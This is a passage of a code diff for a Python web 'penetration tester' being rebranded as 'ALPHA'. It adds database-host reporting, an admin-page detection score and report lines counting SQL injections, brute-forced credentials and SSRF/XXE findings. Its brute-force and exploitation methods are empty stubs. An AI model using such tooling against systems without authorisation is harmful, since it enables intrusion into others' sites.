-            {"".join([f'<div class="admin-panel"><strong>📍 <a href="{panel["url"]}" class="clickable" target="_blank">{panel["url"]}</a></strong> - Status: {panel["status"]} - {panel["title"]}</div>' for panel in self.results['admin_panels']])}
+            {"".join([f'<div class="admin-panel"><strong>📍 <a href="{panel["url"]}" class="clickable" target="_blank">{panel["url"]}</a></strong> - Status: {panel["status"]} - {panel["title"]} - Type: {panel.get("type", "Unknown")}</div>' for panel in self.results['admin_panels']])}
         </div>
         
         {brute_force_section}
         
         {api_section}
+        
+        {database_section}
         
         {cors_section}
         
@@ -1875,10 +2377,6 @@ class UltimateAIPenetrationTester:
         </div>
         
         <div class="section">
-            <h2 class="section-title">🔧 Technical Intelligence</h2>
-            <div class="stats-grid">
-                <div class="
-                        <div class="section">
             <h2 class="section-title">🔧 Technical Intelligence</h2>
             <div class="stats-grid">
                 <div class="stat-card">
@@ -1905,7 +2403,8 @@ class UltimateAIPenetrationTester:
                     <strong>SSL Certificate:</strong> {'Valid' if self.results['ssl_info'].get('valid') else 'Invalid'}<br>
                     <strong>Technologies Detected:</strong> {', '.join(self.results['technologies']) if self.results['technologies'] else 'None'}<br>
                     <strong>Hidden Directories:</strong> {len(self.results['hidden_directories'])} found<br>
-                    <strong>Backup Files:</strong> {len(self.results['backup_files'])} found
+                    <strong>Backup Files:</strong> {len(self.results['backup_files'])} found<br>
+                    <strong>Database Information:</strong> {len(self.results['database_info'])} records found
                 </div>
             </div>
         </div>
@@ -1920,7 +2419,8 @@ class UltimateAIPenetrationTester:
                 <p><strong>5. Report includes {len(self.results['working_sql_injections'])} confirmed working exploits</strong></p>
                 <p><strong>6. Brute Force found {len(self.results['brute_force_results'])} valid credentials</strong></p>
                 <p><strong>7. API Endpoints: {len(self.results['api_endpoints'])} discovered endpoints</strong></p>
-                <p><strong>8. Critical Vulnerabilities: {len(self.results['cors_vulnerabilities']) + len(self.results['ssrf_vulnerabilities']) + len(self.results['xxe_vulnerabilities'])} found</strong></p>
+                <p><strong>8. Database Information: {len(self.results['database_info'])} records found</strong></p>
+                <p><strong>9. Critical Vulnerabilities: {len(self.results['cors_vulnerabilities']) + len(self.results['ssrf_vulnerabilities']) + len(self.results['xxe_vulnerabilities'])} found</strong></p>
             </div>
         </div>
         
@@ -1950,22 +2450,11 @@ class UltimateAIPenetrationTester:
     <script>
         // Add interactivity
         document.addEventListener('DOMContentLoaded', function() {{
-            // Animate progress bars
-            const progressBars = document.querySelectorAll('.progress-fill');
-            progressBars.forEach(bar => {{
-                const width = bar.style.width;
-                bar.style.width = '0';
-                setTimeout(() => {{
-                    bar.style.width = width;
-                }}, 500);
-            }});
-            
             // Add click analytics
             const links = document.querySelectorAll('.clickable');
             links.forEach(link => {{
                 link.addEventListener('click', function() {{
                     console.log('Link clicked:', this.href);
-                    // You can add tracking here
                 }});
             }});
             
@@ -1991,12 +2480,12 @@ class UltimateAIPenetrationTester:
 </html>
 """
 
-    def show_ultimate_summary(self, report_path):
-        """Show ultimate summary"""
+    def show_ALPHA_summary(self, report_path):
+        """Show ALPHA summary"""
         total_time = time.time() - self.start_time
         
         print(f"\n{Fore.GREEN}{'='*120}{Style.RESET_ALL}")
-        print(f"{Fore.GREEN}🎉 ULTIMATE AI-POWERED PENETRATION TEST PRO COMPLETED SUCCESSFULLY! 🎉{Style.RESET_ALL}")
+        print(f"{Fore.GREEN}🎉 ALPHA AI-POWERED PENETRATION TEST PRO COMPLETED SUCCESSFULLY! 🎉{Style.RESET_ALL}")
         print(f"{Fore.GREEN}{'='*120}{Style.RESET_ALL}")
         
         # Advanced statistics
@@ -2022,6 +2511,7 @@ class UltimateAIPenetrationTester:
         print(f"   🔄 CORS Vulnerabilities: {len(self.results['cors_vulnerabilities'])}")
         print(f"   🌐 SSRF Vulnerabilities: {len(self.results['ssrf_vulnerabilities'])}")
         print(f"   📄 XXE Vulnerabilities: {len(self.results['xxe_vulnerabilities'])}")
+        print(f"   🗄️ Database Information: {len(self.results['database_info'])}")
         print(f"   🛡️ WAF Detected: {'Yes' if self.results['waf_detected'] else 'No'}")
         
         # Show critical findings
@@ -2045,6 +2535,12 @@ class UltimateAIPenetrationTester:
             print(f"\n{Fore.BLUE}🔗 DISCOVERED API ENDPOINTS:{Style.RESET_ALL}")
             for endpoint in self.results['api_endpoints'][:5]:  # Show first 5
                 print(f"   🌐 {endpoint['url']} - Status: {endpoint['status']}")
+        
+        # Show database information
+        if self.results['database_info']:
+            print(f"\n{Fore.MAGENTA}🗄️ DATABASE INFORMATION:{Style.RESET_ALL}")
+            for db in self.results['database_info'][:3]:  # Show first 3
+                print(f"   🌐 {db['host']} - IP: {db['ip']}")
         
         print(f"\n{Fore.CYAN}💾 REPORTS GENERATED:{Style.RESET_ALL}")
         print(f"   📄 HTML Report: {report_path}")
@@ -2128,7 +2624,7 @@ class UltimateAIPenetrationTester:
         pass
 
     def ai_credential_bruteforce(self):
-        print(f"{Fore.BLUE}🔑 AI Credential Bruteforce...{Style.RESET_ALL}")
+        print(f"{Fore.BLUE}🔑 ALPHA Credential Bruteforce...{Style.RESET_ALL}")
         pass
 
     def advanced_exploitation(self):
@@ -2136,24 +2632,52 @@ class UltimateAIPenetrationTester:
         pass
 
     def generate_json_report(self, reports_dir, timestamp):
-        filename = f"Ultimate_Pentest_Report_{timestamp}.json"
+        filename = f"ALPHA_Pentest_Report_{timestamp}.json"
         filepath = os.path.join(reports_dir, filename)
         with open(filepath, 'w') as f:
             json.dump(self.results, f, indent=4)
         return filepath
 
     def generate_csv_report(self, reports_dir, timestamp):
-        filename = f"Ultimate_Pentest_Report_{timestamp}.csv"
+        filename = f"ALPHA_Pentest_Report_{timestamp}.csv"
         filepath = os.path.join(reports_dir, filename)
         # CSV implementation would go here
         return filepath
 
-# Additional utility functions
+    def is_admin_panel_advanced(self, html_content, url):
+        """Advanced admin panel detection"""
+        content_lower = html_content.lower()
+        url_lower = url.lower()
+        
+        # ALPHA scoring system
+        score = 0
+        
+        # URL-based scoring
+        admin_url_indicators = ['admin', 'login', 'dashboard', 'panel', 'control', 'manage']
+        for indicator in admin_url_indicators:
+            if indicator in url_lower:
+                score += 3
+        
+        # Content-based scoring
+        admin_content_indicators = [
+            'password', 'username', 'sign in', 'log in', 'admin panel',
+            'control panel', 'dashboard', 'welcome admin', 'administrator'
+        ]
+        
+        for indicator in admin_content_indicators:
+            if indicator in content_lower:
+                score += 2
+        
+        # Form detection
+        if '<form' in content_lower and ('password' in content_lower or 'login' in content_lower):
+            score += 5
+        
+        return score >= 6
+
 def check_dependencies():
     """Check if all required dependencies are installed"""
     required_modules = [
-        'requests', 'colorama', 'bs4',  # bs4 for beautifulsoup4
-        'urllib3', 'cryptography', 'dns'  # dns for dnspython
+        'requests', 'colorama', 'urllib3'
     ]
     
     missing_modules = []
@@ -2161,35 +2685,39 @@ def check_dependencies():
         try:
             __import__(module)
         except ImportError:
-            # Map back to original names for user message
-            original_names = {
-                'bs4': 'beautifulsoup4',
-                'dns': 'dnspython'
-            }
-            missing_modules.append(original_names.get(module, module))
+            missing_modules.append(module)
     
     if missing_modules:
         print(f"{Fore.RED}❌ Missing dependencies: {', '.join(missing_modules)}{Style.RESET_ALL}")
         print(f"{Fore.YELLOW}💡 Install them using: pip install {' '.join(missing_modules)}{Style.RESET_ALL}")
         return False
     
-    print(f"{Fore.GREEN}✅ All dependencies are installed!{Style.RESET_ALL}")
+    print(f"{Fore.GREEN}✅ All core dependencies are installed!{Style.RESET_ALL}")
+    
+    # Check for optional dependencies
+    if not BEAUTIFULSOUP_AVAILABLE:
+        print(f"{Fore.YELLOW}⚠️ Optional: beautifulsoup4 not available (pip install beautifulsoup4){Style.RESET_ALL}")
+    if not DNS_AVAILABLE:
+        print(f"{Fore.YELLOW}⚠️ Optional: dnspython not available (pip install dnspython){Style.RESET_ALL}")
+    if not CONCURRENT_AVAILABLE:
+        print(f"{Fore.YELLOW}⚠️ Optional: concurrent.futures not available (using basic threading){Style.RESET_ALL}")
+    
     return True
 
 def main():
-    """Main function to run the Ultimate AI Penetration Tester"""
+    """Main function to run the ALPHA Penetration Tester"""
     try:
         # Check dependencies
         if not check_dependencies():
             return
         
-        print(f"{Fore.CYAN}🚀 Initializing ULTIMATE AI-Powered Penetration Testing Framework PRO...{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}🚀 Initializing ALPHA AI-Powered Penetration Testing Framework PRO...{Style.RESET_ALL}")
         print(f"{Fore.YELLOW}📋 Version 2.0 - Advanced Web Application Security Scanner{Style.RESET_ALL}")
-        print(f"{Fore.GREEN}🔧 Loading AI models and security databases...{Style.RESET_ALL}")
+        print(f"{Fore.GREEN}🔧 Loading ALPHA models and security databases...{Style.RESET_ALL}")
         
         # Initialize and run the tester
-        tester = UltimateAIPenetrationTester()
-        tester.run_ultimate_pentest()
+        tester = ALPHAAIPenetrationTester()
+        tester.run_ALPHA_pentest()
         
     except KeyboardInterrupt:
         print(f"\n{Fore.RED}❌ Program interrupted by user{Style.RESET_ALL}")
@@ -2198,6 +2726,6 @@ def main():
         import traceback
         traceback.print_exc()
 
-# Run the ultimate tool
+# Run the ALPHA tool
 if __name__ == "__main__":
     main()
